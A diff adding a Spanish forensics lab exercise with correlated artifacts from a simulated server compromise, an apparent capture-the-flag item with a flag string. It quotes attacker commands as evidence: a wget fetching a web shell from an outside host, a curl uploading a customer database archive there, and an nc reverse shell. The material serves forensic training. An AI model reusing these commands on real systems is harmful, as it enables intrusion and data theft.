@@ -1,0 +1,38 @@
+R4 — extractos de artefactos correlacionados (lectura solamente)
+Caso: labs/lab11-forensia/caso/
+
+=== logs/access.log ===
+20: 185.220.101.42 - - [05/Sep/2026:02:19:02 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5 "-" "curl/8.5"
+22: 185.220.101.42 - - [05/Sep/2026:02:23:15 +0000] "GET /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt HTTP/1.1" 200 48210 "-" "curl/8.5"
+
+=== disco/listado.txt ===
+4: 2026-09-05 02:19  431    /var/www/uploads/shell.php
+6: 2026-09-05 02:22  62     /etc/cron.d/phantom-maint         (persistencia)
+7: 2026-09-05 02:23  48210  /tmp/.exfil/clientes.tar.gz        (datos preparados para exfiltrar)
+
+=== disco/var/www/uploads/shell.php.evidencia.txt ===
+8:   if (isset($_GET['c'])) { sys'tem($_GET['c']); }   // <- RCE via ?c= (defangeado)
+9:   // persistencia: se relanza por cron cada 5 min (ver /etc/cron.d/phantom-maint)
+
+=== memoria/bash_history.txt ===
+8: tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+9: curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+
+=== memoria/netstat.txt ===
+4: tcp   10.0.0.5:41022        45.13.37.7:4444     ESTABLISHED  1490  nc        <- C2 saliente
+
+=== memoria/lsof.txt ===
+3: 1490  nc            3u    IPv4   10.0.0.5:41022->45.13.37.7:4444
+5: 1240  bash          1w    REG    /tmp/.exfil/clientes.tar.gz
+
+=== memoria/pslist.txt ===
+1: # volatility3 linux.pslist  (extracto)   captura: 2026-09-05 02:30 UTC
+7: 1240  1201  www-data  bash            <- shell interactiva del atacante
+8: 1477  1240  root      system-check    <- SUID root (escalada); euid=0
+9: 1490  1477  root      nc 45.13.37.7 4444   <- reverse shell / C2
+
+Límites: el historial no contiene timestamps por comando; el listado de disco indica
+solo el minuto y no declara zona horaria. pslist/netstat son una captura de 02:30 UTC.
+La respuesta HTTP de access.log registra 200/48210 al leer la base de datos, pero los
+artefactos no demuestran que el servidor C2 recibiera el archivo ni que el canal nc lo
+transportara. El contenido de /etc/cron.d/phantom-maint no está en el paquete.
